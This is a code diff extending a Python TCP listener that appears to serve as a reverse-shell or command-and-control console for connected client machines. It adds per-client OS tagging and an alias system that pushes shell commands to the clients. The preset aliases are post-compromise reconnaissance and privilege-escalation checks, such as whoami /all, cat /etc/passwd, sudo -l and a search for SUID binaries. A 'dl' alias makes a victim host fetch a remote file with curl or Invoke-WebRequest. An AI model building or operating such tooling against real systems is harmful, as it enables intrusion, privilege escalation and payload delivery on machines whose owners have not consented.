@@ -11,6 +11,11 @@ Console commands (type at the prompt):
     <id> <message>       send <message> to client <id>      e.g.  2 hello there
     all <message>        broadcast to every client
     kick <id>            disconnect client <id>
+    os <id> <win|lin>    flag client <id>'s OS (windows / linux)
+    alias                list aliases
+    alias add <name> <win-cmd> ::: <lin-cmd>   define an alias
+    alias del <name>     remove an alias
+    run <id> <name>      run alias <name> on client <id> (OS-appropriate cmd)
     exit                 shut everything down  (Ctrl-C / Ctrl-D ignored)
 
 Incoming data from clients prints above the prompt as:  [<id>] <data>
@@ -25,6 +30,7 @@ from datetime import datetime
 from prompt_toolkit import PromptSession
 from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit.patch_stdout import patch_stdout
+from prompt_toolkit.shortcuts import CompleteStyle
 
 
 def ts():
@@ -38,7 +44,22 @@ LOG_DIR = "logs"
 clients = {}          # id -> socket
 addrs = {}            # id -> (ip, port)
 logfiles = {}         # id -> open file handle
+os_types = {}         # id -> "windows" | "linux"
 next_id = 1
+
+# name -> {"windows": cmd, "linux": cmd}. Use {0},{1},... for positional args.
+aliases = {
+    "whoami":    {"windows": "whoami /all",                  "linux": "id"},
+    "sysinfo":   {"windows": "systeminfo",                   "linux": "uname -a; cat /etc/os-release"},
+    "net":       {"windows": "ipconfig /all",                "linux": "ip a"},
+    "ps":        {"windows": "Get-Process",                  "linux": "ps aux"},
+    "ports":     {"windows": "netstat -ano",                 "linux": "ss -tulpn"},
+    "users":     {"windows": "net user",                     "linux": "cat /etc/passwd"},
+    "admins":    {"windows": "net localgroup administrators", "linux": "cat /etc/group | grep -E 'sudo|wheel'"},
+    "privesc":   {"windows": "whoami /priv",                 "linux": "sudo -l; find / -perm -4000 -type f 2>/dev/null"},
+    "tasks":     {"windows": "schtasks /query /fo LIST",     "linux": "crontab -l; ls -la /etc/cron*"},
+    "dl":        {"windows": "iwr -Uri {0} -OutFile {1}",    "linux": "curl -fsSL {0} -o {1}"},
+}
 lock = threading.Lock()
 log_lock = threading.Lock()
 running = threading.Event()   # set while server should keep running
@@ -58,6 +79,7 @@ def log_event(cid, direction, text):
 
 def recv_loop(cid, conn):
     """Print whatever a client sends, then clean up on disconnect."""
+    global interact_cid
     try:
         while running.is_set():
             data = conn.recv(4096)
@@ -75,13 +97,13 @@ def recv_loop(cid, conn):
     except OSError:
         pass
     finally:
-        global interact_cid
         if cid == interact_cid:
             interact_cid = None
             print(f"\n[*] interacted client {cid} gone, back to console")
         with lock:
             clients.pop(cid, None)
             addr = addrs.pop(cid, None)
+            os_types.pop(cid, None)
         with log_lock:
             f = logfiles.pop(cid, None)
             if f is not None:
@@ -133,10 +155,54 @@ def send_to(cid, msg):
         print(f"[!] failed to send to {cid}")
 
 
+def run_alias(cid, name, args=()):
+    """Send the OS-appropriate command for alias <name> to client <cid>."""
+    spec = aliases.get(name)
+    if spec is None:
+        print(f"[!] no alias '{name}' (try 'alias')")
+        return
+    ostype = os_types.get(cid)
+    if ostype is None:
+        print(f"[!] client {cid} has no OS flag; use 'os {cid} windows|linux'")
+        return
+    cmd = spec.get(ostype)
+    if cmd is None:
+        print(f"[!] alias '{name}' has no {ostype} command")
+        return
+    try:
+        cmd = cmd.format(*args)
+    except IndexError:
+        needed = cmd.count("{")
+        print(f"[!] alias '{name}' needs {needed} arg(s):  run {cid} {name} <arg0> [arg1 ...]")
+        return
+    print(f"[*] alias '{name}' -> client {cid} ({ostype}): {cmd}")
+    send_to(cid, cmd)
+
+
+HELP = """\
+  list / ls                         show connected clients
+  <id> <message>                    send message to client
+  all <message>                     broadcast to all clients
+  kick <id>                         disconnect client
+  interact <id> / i <id>            raw passthrough mode (Ctrl-C or ~. to exit)
+  os                                list OS flags
+  os <id> <windows|linux>           set client OS flag
+  alias                             list aliases
+  alias add <name> <win> ::: <lin>  define alias
+  alias del <name>                  remove alias
+  run <id> <name> [arg0] [arg1] ... run alias on client ({0}/{1} substituted)
+  exit / quit                       shut down server\
+"""
+
+
 def handle(line):
     """Process one console command. Return False to quit."""
     if line in ("quit", "exit"):
         return False
+
+    if line in ("help", "?"):
+        print(HELP)
+        return True
 
     parts0 = line.split()
     if parts0 and parts0[0] in ("interact", "i"):
@@ -161,7 +227,70 @@ def handle(line):
                 print("    (no clients)")
             for cid in sorted(clients):
                 ip, port = addrs[cid]
-                print(f"    {cid}: {ip}:{port}")
+                ot = os_types.get(cid, "?")
+                print(f"    {cid}: {ip}:{port}  [{ot}]")
+        return True
+
+    if parts0 and parts0[0] == "os":
+        if len(parts0) == 1:
+            with lock:
+                flagged = {c: os_types[c] for c in sorted(os_types)}
+            if not flagged:
+                print("    (no OS flags set)")
+            for c, ot in flagged.items():
+                print(f"    {c}: {ot}")
+            return True
+        if len(parts0) == 3 and parts0[1].isdigit() and parts0[2] in ("windows", "linux"):
+            cid = int(parts0[1])
+            with lock:
+                if cid not in clients:
+                    print(f"[!] no client with id {cid}")
+                    return True
+                os_types[cid] = parts0[2]
+            print(f"[*] client {cid} flagged {parts0[2]}")
+            return True
+        print("[!] usage: os <id> <windows|linux>")
+        return True
+
+    if parts0 and parts0[0] == "alias":
+        if len(parts0) == 1:
+            if not aliases:
+                print("    (no aliases)")
+            for name in sorted(aliases):
+                spec = aliases[name]
+                print(f"    {name}:")
+                print(f"        windows: {spec.get('windows', '-')}")
+                print(f"        linux:   {spec.get('linux', '-')}")
+            return True
+        if parts0[1] == "add":
+            # alias add <name> <win-cmd> ::: <lin-cmd>
+            body = line.split(maxsplit=3)
+            if len(body) < 4 or ":::" not in body[3]:
+                print("[!] usage: alias add <name> <win-cmd> ::: <lin-cmd>")
+                return True
+            name = body[2]
+            win_cmd, lin_cmd = (s.strip() for s in body[3].split(":::", 1))
+            if not win_cmd or not lin_cmd:
+                print("[!] usage: alias add <name> <win-cmd> ::: <lin-cmd>")
+                return True
+            aliases[name] = {"windows": win_cmd, "linux": lin_cmd}
+            print(f"[*] alias '{name}' set  (windows: {win_cmd} | linux: {lin_cmd})")
+            return True
+        if parts0[1] == "del":
+            if len(parts0) != 3 or parts0[2] not in aliases:
+                print("[!] usage: alias del <name>")
+                return True
+            aliases.pop(parts0[2])
+            print(f"[*] alias '{parts0[2]}' removed")
+            return True
+        print("[!] usage: alias | alias add <name> <win> ::: <lin> | alias del <name>")
+        return True
+
+    if parts0 and parts0[0] == "run":
+        if len(parts0) < 3 or not parts0[1].isdigit():
+            print("[!] usage: run <id> <alias> [arg0] [arg1] ...")
+            return True
+        run_alias(int(parts0[1]), parts0[2], parts0[3:])
         return True
 
     if line.startswith("all "):
@@ -209,7 +338,7 @@ def main():
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind((HOST, PORT))
     srv.listen()
-    print(f"[*] listening on {HOST}:{PORT}  (type 'list', '<id> msg', 'all msg', 'kick <id>', 'quit')")
+    print(f"[*] listening on {HOST}:{PORT}  (commands: list, <id> <msg>, all <msg>, kick <id>, interact <id>, os <id> <windows|linux>, alias, run <id> <alias>, exit)")
     print(f"[*] logging per-client to ./{LOG_DIR}/")
 
     accept_thread = threading.Thread(target=accept_loop, args=(srv,), daemon=True)
@@ -217,10 +346,14 @@ def main():
 
     global interact_cid
     completer = WordCompleter(
-        ["list", "ls", "all", "kick", "interact", "exit", "quit"],
+        ["list", "ls", "all", "kick", "interact", "i", "os", "alias", "run", "help", "exit", "quit"],
         ignore_case=True,
     )
-    session = PromptSession(completer=completer)
+    session = PromptSession(
+        completer=completer,
+        complete_while_typing=False,
+        complete_style=CompleteStyle.READLINE_LIKE,
+    )
     # patch_stdout() routes all print() output (including from threads)
     # so it never corrupts the line you're editing.
     with patch_stdout():
